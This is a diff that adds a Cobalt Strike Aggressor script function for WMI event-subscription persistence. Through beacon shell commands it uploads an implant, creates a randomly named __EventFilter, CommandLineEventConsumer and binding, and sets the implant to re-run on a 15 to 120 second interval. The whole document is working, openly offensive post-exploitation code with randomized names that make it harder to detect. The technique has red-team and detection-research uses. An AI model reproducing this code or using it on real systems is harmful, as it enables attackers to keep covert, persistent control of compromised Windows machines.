@@ -1,0 +1,30 @@
+include("/home/kali/AggressorScripts/persistence/utils.sl");
+
+####wmiSubscription(beacon_id, implant_path, filter_name, consumer_name, seconds)
+sub wmiSubscription{
+	local('$implant_path $implant_directory $filter_name $consumer_name $random_seconds');
+
+	if($2 !is $null){
+		$implant_path = $2;
+	}else{
+		$implant_path = uploadMalFile($1);
+	}
+	
+	$implant_directory = substr($implant_path, 0, lindexOf($implant_path, "\\"));
+
+	$filter_name = iff($3 !is $null, $3, randomName(24));
+	$consumer_name = iff($4 !is $null, $4, randomName(24));
+	if($5 !is $null){
+		$random_seconds = $5;
+	}else{
+		$random_seconds = integerrangerand(15, 120);
+	}
+	
+	$random_seconds = round($random_seconds);
+
+	bshell($1, "wmic /NAMESPACE:\"\\\\root\\subscription\" PATH __EventFilter CREATE Name=\"$filter_name\", EventNameSpace=\"root\\cimv2\",QueryLanguage=\"WQL\", Query=\"SELECT * FROM __InstanceModificationEvent WITHIN $random_seconds WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"");
+	
+	bshell($1, "wmic /NAMESPACE:\"\\\\root\\subscription\" PATH CommandLineEventConsumer CREATE Name=\"$consumer_name\", ExecutablePath=\"$implant_directory\",CommandLineTemplate=\"$implant_path\"");
+	
+	bshell($1, "wmic /NAMESPACE:\"\\\\root\\subscription\" PATH __FilterToConsumerBinding CREATE Filter=\"__EventFilter.Name=\\\"$filter_name\\\"\", Consumer=\"CommandLineEventConsumer.Name=\\\"$consumer_name\\\"\"");
+}
